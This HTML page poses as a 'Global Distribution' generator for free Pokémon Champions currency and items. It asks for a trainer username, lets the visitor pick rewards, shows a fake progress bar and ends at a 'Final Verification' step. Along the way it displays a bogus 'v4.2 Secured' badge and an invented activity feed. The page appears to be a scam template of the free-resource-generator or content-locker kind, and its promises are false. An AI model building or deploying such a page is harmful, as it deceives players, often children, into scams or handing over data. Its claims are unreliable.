<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pokémon Champions 2026 - Global Resource Sync</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Inter:wght@300;500;800&display=swap');

        :root {
            --primary: #00f2ff;
            --accent: #ff007a;
            --gold: #ffcc00;
            --glass-bg: rgba(10, 15, 30, 0.9);
            --neon-shadow: 0 0 20px rgba(0, 242, 255, 0.4);
        }

        body {
            background: #02050a;
            color: #fff;
            font-family: 'Inter', sans-serif;
            margin: 0; padding: 0; overflow-x: hidden;
            background: linear-gradient(rgba(2, 5, 10, 0.85), rgba(2, 5, 10, 0.85)), 
                        url('https://images.alphacoders.com/132/1328639.png');
            background-size: cover; background-attachment: fixed; background-position: center;
        }

        nav {
            background: rgba(0,0,0,0.7); padding: 15px 5%;
            display: flex; justify-content: space-between; align-items: center;
            border-bottom: 1px solid var(--primary); backdrop-filter: blur(10px);
        }

        .logo-nav { width: 120px; filter: drop-shadow(0 0 5px var(--primary)); }

        .container { display: flex; flex-direction: column; align-items: center; padding: 40px 20px; }

        .main-card {
            background: var(--glass-bg); backdrop-filter: blur(25px);
            border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 30px;
            width: 100%; max-width: 500px; padding: 40px;
            box-shadow: 0 25px 60px rgba(0,0,0,0.9), var(--neon-shadow);
            position: relative; text-align: center;
        }

        .badge-pro {
            background: linear-gradient(45deg, var(--primary), var(--accent));
            font-size: 0.65rem; padding: 6px 14px; border-radius: 50px;
            font-weight: 800; text-transform: uppercase; position: absolute;
            top: 20px; right: 20px; letter-spacing: 1px; box-shadow: 0 0 10px var(--accent);
        }

        h2, h3 { font-family: 'Orbitron', sans-serif; text-transform: uppercase; letter-spacing: 1px; }

        .input-ui {
            background: rgba(0, 0, 0, 0.6); border: 1px solid var(--primary);
            border-radius: 12px; padding: 18px; width: 100%; color: #fff;
            font-size: 1rem; margin-bottom: 15px; box-sizing: border-box; outline: none;
        }

        .grid-rewards { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin: 20px 0; }

        .reward-card {
            background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 20px; padding: 20px; cursor: pointer; transition: 0.3s;
            display: flex; flex-direction: column; align-items: center;
        }

        .reward-card:hover, .reward-card.active {
            border-color: var(--primary); background: rgba(0, 242, 255, 0.1); transform: translateY(-5px);
        }

        .reward-img { 
            width: 75px; height: 75px; object-fit: contain; margin-bottom: 10px; 
            animation: float 3s ease-in-out infinite;
        }

        @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-8px); } }

        .reward-card span { display: block; font-weight: 900; font-size: 1.2rem; }
        .reward-card small { color: var(--primary); font-size: 0.75rem; font-weight: bold; }

        .btn-action {
            background: linear-gradient(to right, var(--primary), #00a2ff);
            color: #000; width: 100%; padding: 20px; border: none; border-radius: 15px;
            font-weight: 900; font-size: 1.2rem; cursor: pointer; font-family: 'Orbitron', sans-serif;
        }

        .characters-showcase {
            margin-top: 40px; display: flex; gap: 15px; overflow-x: auto; width: 100%; max-width: 500px;
        }

        .char-item { min-width: 120px; text-align: center; background: var(--glass-bg); border-radius: 15px; padding: 10px; }
        .char-item img { width: 100%; border-radius: 10px; }

        .activity-feed {
            margin-top: 25px; padding: 12px; background: rgba(0,0,0,0.4); border-radius: 50px; font-size: 0.8rem; color: #00f2ff;
        }

        .hidden { display: none; }
        .loader { width: 60px; height: 60px; border: 4px solid #111; border-top: 4px solid var(--primary); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<nav>
    <img src="https://upload.wikimedia.org/wikipedia/commons/9/98/International_Pok%C3%A9mon_logo.svg" class="logo-nav">
</nav>

<div class="container">
    <div class="main-card">
        <div class="badge-pro">v4.2 Secured</div>
        
        <div id="ui-step1">
            <h2 style="margin-top: 40px; color: var(--primary);">Global Distribution</h2>
            <input type="text" class="input-ui" id="trainer-name" placeholder="Enter Trainer Username...">
            <button class="btn-action" onclick="toStep2()">Secure Connection</button>
        </div>

        <div id="ui-step2" class="hidden">
            <h3 style="margin-bottom: 20px;">2. SELECT ASSETS</h3>
            <div class="grid-rewards">
                <div class="reward-card" onclick="selectReward(this, '50,000 VP')">
                    <img src="https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/items/poke-ball.png" alt="VP" class="reward-img">
                    <span>50,000</span><small>Victory Points</small>
                </div>
                <div class="reward-card" onclick="selectReward(this, '10,000 Gems')">
                    <img src="https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/items/rare-candy.png" alt="Gems" class="reward-img">
                    <span>10,000</span><small>Champion Gems</small>
                </div>
                <div class="reward-card" onclick="selectReward(this, 'Elite Pass')">
                    <img src="https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/items/eon-ticket.png" alt="Pass" class="reward-img">
                    <span>S12</span><small>Elite Battle Pass</small>
                </div>
                <div class="reward-card" onclick="selectReward(this, 'Omni Stone')">
                    <img src="https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/items/mega-ring.png" alt="Stone" class="reward-img">
                    <span>OMNI</span><small>Evolution Stone</small>
                </div>
            </div>
            <button class="btn-action" onclick="toStep3()">Initiate Generator</button>
        </div>

        <div id="ui-sync" class="hidden" style="padding: 40px 0;">
            <div class="loader"></div>
            <h4 id="status-text">Handshaking...</h4>
            <div style="width: 100%; background: #111; height: 8px; border-radius: 10px; overflow: hidden; margin-top: 20px;">
                <div id="progress-bar" style="width: 0%; height: 100%; background: var(--primary); transition: 0.3s;"></div>
            </div>
        </div>

        <div id="ui-locker" class="hidden">
            <h3 style="color: var(--accent);">3. FINAL VERIFICATION</h3>
            <p>Verification Pending for <span id="summary-res">Resources</span>...</p>
        </div>

        <div class="activity-feed">
            <i class="fas fa-bolt"></i> <span id="live-text">Trainer `Volt_King` syncing...</span>
        </div>
    </div>

    <div class="characters-showcase">
        <div class="char-item"><img src="https://assets.pokemon.com/assets/cms2/img/pokedex/full/006.png"><p>MEGA-X</p></div>
        <div class="char-item"><img src="https://assets.pokemon.com/assets/cms2/img/pokedex/full/448.png"><p>LUCARIO</p></div>
        <div class="char-item"><img src="https://assets.pokemon.com/assets/cms2/img/pokedex/full/445.png"><p>GARCHOMP</p></div>
    </div>
</div>

<script>
    let selectedItem = "Resources";
    function toStep2() {
        if(document.getElementById('trainer-name').value.length < 3) return alert('Enter Name');
        document.getElementById('ui-step1').classList.add('hidden');
        document.getElementById('ui-step2').classList.remove('hidden');
    }
    function selectReward(el, name) {
        document.querySelectorAll('.reward-card').forEach(r => r.classList.remove('active'));
        el.classList.add('active');
        selectedItem = name;
    }
    function toStep3() {
        document.getElementById('ui-step2').classList.add('hidden');
        document.getElementById('ui-sync').classList.remove('hidden');
        document.getElementById('summary-res').innerText = selectedItem;
        let progress = 0;
        const interval = setInterval(() => {
            progress += 5;
            document.getElementById('progress-bar').style.width = progress + '%';
            if(progress >= 100) {
                clearInterval(interval);
                document.getElementById('ui-sync').classList.add('hidden');
                document.getElementById('ui-locker').classList.remove('hidden');
            }
        }, 150);
    }
</script>
</body>
</html>
